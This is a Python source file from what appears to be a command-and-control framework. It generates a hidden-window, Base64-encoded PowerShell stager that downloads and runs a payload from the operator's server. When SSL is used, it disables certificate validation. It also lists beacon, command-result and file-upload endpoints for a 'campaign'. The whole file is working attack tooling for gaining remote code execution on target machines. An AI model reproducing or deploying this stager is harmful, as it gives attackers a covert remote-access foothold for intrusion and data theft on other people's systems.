import os
import base64
import json

def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
    """
    Generate a Base64 encoded PowerShell agent stager
    
    Args:
        host: Server hostname or IP
        port: Server port
        ssl: Whether to use SSL/TLS
        campaign_folder: Path to the campaign folder
        
    Returns:
        String containing the generated PowerShell Base64 command
    """
    # Check if the new PowerShell module exists
    powershell_module_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "powershell", "agent.py")
    
    # If the new module exists, use it
    if os.path.exists(powershell_module_path):
        try:
            # Import the module dynamically
            import importlib.util
            spec = importlib.util.spec_from_file_location("powershell_agent", powershell_module_path)
            powershell_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(powershell_module)
            
            # Call the function from the new module
            return powershell_module.generate_pwsh_base64_str(host, port, ssl, campaign_folder)
        except Exception as e:
            print(f"Error using new PowerShell module: {e}. Falling back to original implementation.")
    
    # If we can't use the new module, use the original implementation
    return original_generate_pwsh_base64_str(host, port, ssl, campaign_folder)

def original_generate_pwsh_base64_str(host, port, ssl, campaign_folder):
    """Original implementation of PowerShell Base64 agent generation"""
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get custom URL paths from url_paths.json if it exists
    url_paths_file = os.path.join(campaign_folder, "url_paths.json")
    url_paths = {
        "beacon_path": "/beacon",
        "agent_path": "/raw_agent",
        "stager_path": "/b64_stager",
        "cmd_result_path": "/command_result",
        "file_upload_path": "/file_upload"
    }
    
    if os.path.exists(url_paths_file):
        try:
            with open(url_paths_file, 'r') as f:
                custom_paths = json.load(f)
                url_paths.update(custom_paths)
        except Exception as e:
            print(f"Warning: Could not load URL paths: {e}")
    
    # Make sure all paths start with a leading slash
    for key in url_paths:
        if not url_paths[key].startswith('/'):
            url_paths[key] = '/' + url_paths[key]
    
    # Get the key information for documentation
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_info = "Using campaign encryption key"
    
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
            key_info = f"Using encryption key from keys.json"
        except Exception as e:
            key_info = f"Warning: Error reading keys file: {e}"
    
    http = "https" if ssl else "http"
    stager_path = url_paths["stager_path"]
    
    # Base agent code
    base_agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{stager_path}');IEX($S)"
    
    # Add SSL certificate validation bypass if using SSL
    if ssl:
        agent = (
            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;\n"
            "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n"
            "try {\n"
            f"    {base_agent}\n"
            "} catch {\n"
            "    $errorMessage = $_.Exception.Message\n"
            "    $errorDetails = $_ | Format-List -Force | Out-String\n"
            "    Write-Host \"Error connecting to C2: $errorMessage`n$errorDetails\"\n"
            "}"
        )
    else:
        agent = base_agent
    
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    powershell_command = f"powershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
    
    # Create a more detailed information about the agent
    details = (
        f"Powershell Base64 Agent Details:\n"
        f"1. Base Command: {powershell_command}\n"
        f"2. Encryption: {key_info}\n"
        f"3. System Identification: Full system identification enabled\n"
        f"4. SSL Validation: {'Certificate validation bypassed (required for self-signed certs)' if ssl else 'No SSL used'}\n"
        f"5. Communication Paths:\n"
        f"   - Beacon URL: {http}://{host}:{port}{url_paths['beacon_path']}\n"
        f"   - Agent Download URL: {http}://{host}:{port}{url_paths['agent_path']}\n"
        f"   - Stager URL: {http}://{host}:{port}{url_paths['stager_path']}\n"
        f"   - Command Result URL: {http}://{host}:{port}{url_paths['cmd_result_path']}\n"
        f"   - File Upload URL: {http}://{host}:{port}{url_paths['file_upload_path']}\n"
        f"6. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
        f"7. Headers: Legitimate web browsing headers included\n"
        f"8. Error Handling: Enhanced error reporting enabled\n"
    )
    
    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: {key_info}\nIdentity: Full system identification enabled"
    with open(os.path.join(agents_folder, "powershell_base64.txt"), "w") as f:
        f.write(details)
    
    return f"Powershell Base64 agent generated and saved to {os.path.join(agents_folder, 'powershell_base64.txt')}\n{result}"